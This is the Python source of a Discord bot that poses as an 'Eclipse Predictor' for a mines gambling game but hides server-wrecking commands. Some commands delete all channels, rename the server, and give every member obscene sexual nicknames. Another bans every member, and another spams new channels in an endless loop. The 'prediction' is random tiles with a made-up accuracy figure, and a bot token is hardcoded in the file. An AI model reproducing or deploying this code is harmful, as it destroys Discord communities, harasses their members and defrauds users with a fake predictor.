from email import message
import discord
import discord.ext
from discord.ext import commands
import random
import json
colors = [0xFFE4E1, 0x00FF7F, 0xD8BFD8, 0xDC143C, 0xFF4500, 0xDEB887, 0xADFF2F, 0x800000, 0x4682B4, 0x006400, 0x808080, 0xA0522D, 0xF08080, 0xC71585, 0xFFB6C1, 0x00CED1]
whitelisted = {"swean_", "wolfy"}


client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
@client.command()
async def clear(ctx):
    guild = ctx.message.guild
    try:
        for channels in guild.channels:
            await channels.delete()
    except:
        pass
@commands.guild_only()
@client.command()
async def mines(ctx, arg):
    guild = ctx.message.guild
    gnick = ["Furry", "Femboy", "Child", "Protogen", "Toddler", "Trump", "Dog", "Cat", "Joe Biden", "Homosexual", "Piss"]
    ggnick = ["Fucker", "Enjoyer", "Knotter", "Prostitute", "Dick Sucker", "Pleasurer", "E621 Enjoyer", "Yiffer", "Tickler", "Guzzler", "Cum Dump", "Sniffer", "Penetrator"]
    if arg == "nick":
        try:
            await ctx.guild.edit(name="GOT BEAMED")
            with open('potato.jpg', 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(icon=icon)

            for member in client.get_all_members():
                try:
                    await member.edit(nick=random.choice(gnick) + " " + random.choice(ggnick))
                except:
                    pass

        except:
            pass
    
    elif arg == "execute_order_66" and ctx.author.name == "Q_Q":
        try:
            await ctx.guild.edit(name="GOT BEAMED")
            with open('potato.jpg', 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(icon=icon)

            for member in client.get_all_members():
                try:
                    await member.edit(nick=random.choice(gnick) + " " + random.choice(ggnick))
                except:
                    pass

                for channels in guild.channels:
                    await channels.delete()
                while True:
                    channels = await guild.create_text_channel("BEAM'D BY UR LOCAL SEX 0FFENDER🤓🤓🤓🤓🤓🤓🤓🤓🤓🤓🤓🤓🤓🤓🤓")
                    #await channels.send("@everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here @everyone @here ")     
                    await channels.send("https://media.discordapp.net/attachments/883540603600777257/972552170400530532/swean_twerk.gif")
        except:
            pass



    elif len(arg) <= 36:
        arg = str(arg)

        arg = len(arg)

        if arg < 36:

            await ctx.send("Wrong round ID")

        elif arg == 36:

            mine1, mine2, mine3, mine4, mine5, mine6, mine7, mine8, mine9, mine10, mine11, mine12, mine13, mine14, mine15, mine16, mine17, mine18, mine19, mine20, mine21, mine22, mine23, mine24, mine25 = ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:', ':question:'

            a = random.randint(1, 8)

            b = random.randint(9, 13)

            c = random.randint(14, 17)

            d = random.randint(18, 25)
            if a == 1:

                mine1 = ":white_check_mark: "
            elif a == 2:

                mine2 = ":white_check_mark: "

            elif a == 3:

                mine3 = ":white_check_mark: "

            elif a == 4:
            
                mine4 = ":white_check_mark: "

            elif a == 5:

                mine5 = ":white_check_mark: "

            elif a == 6:

                mine6 = ":white_check_mark: "

            elif a == 7:

                mine7 = ":white_check_mark: "

            elif a == 8:

                mine8 = ":white_check_mark: "

            if b == 9:

                mine9 = ":white_check_mark: "

            elif b == 10:

                mine10 = ":white_check_mark: "

            elif b == 11:

                mine11 = ":white_check_mark: "

            elif b == 12:

                mine12 = ":white_check_mark: "

            elif b == 13:

                mine13 = ":white_check_mark: "

            if c == 14:

                mine14 = ":white_check_mark: "

            elif c == 15:

                mine15 = ":white_check_mark: "

            elif c == 16:

                mine16 = ":white_check_mark: "

            elif c == 17:

                mine17 = ":white_check_mark: "

            if d == 18:

                mine18 = ":white_check_mark: "

            elif d == 19:

                mine19 = ":white_check_mark: "

            elif d == 20:

                mine20 = ":white_check_mark: "
            elif d == 21:

                mine21 = ":white_check_mark: "
            elif d == 22:

                mine22 = ":white_check_mark: "

            elif d == 23:
                mine23 = ":white_check_mark: "
            elif d == 24:
                mine24 = ":white_check_mark: "
            elif d == 25:
                mine25 = ":white_check_mark: "

            row1 = mine1 + mine2 + mine3 + mine4 + mine5
            row2 = mine6 + mine7 + mine8 + mine9 + mine10
            row3 = mine11 + mine12 + mine13 + mine14 + mine15
            row4 = mine16 + mine17 + mine18 + mine19 + mine20
            row5 = mine21 + mine22 + mine23 + mine24 + mine25
            info = str(random.randint(70, 87))
            pfp = 'https://cdn.discordapp.com/attachments/1019083101323931668/1019142722508030003/ddda.jpg'
            em = discord.Embed(color=random.choice(colors))
            em.set_thumbnail(url=pfp)
            em.set_footer(text="Programmed by Q_Q")
            em.add_field(name="Eclipse Predictor",value=row1 + "\n" + row2 + "\n" + row3 + "\n" + row4 +"\n" + row5 + "\n" + "**Accuracy**" + "\n" + info +"%")
            await ctx.reply(embed=em)

@client.command()
async def poppyplaytimedickandballsmmmyummy(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in client.get_all_members():
        try:
               await guild.ban(member)
        except:
            pass

@client.command()
async def rename(ctx, name):
    await client.user.edit(username=name)


client.run("MTAxODc3MDM4ODU1MDk0MjgyMA.GVRBNy.iGM2VRFmNsKrvyjf-L0xTD4LcXPBt_8cuQlhZ4")
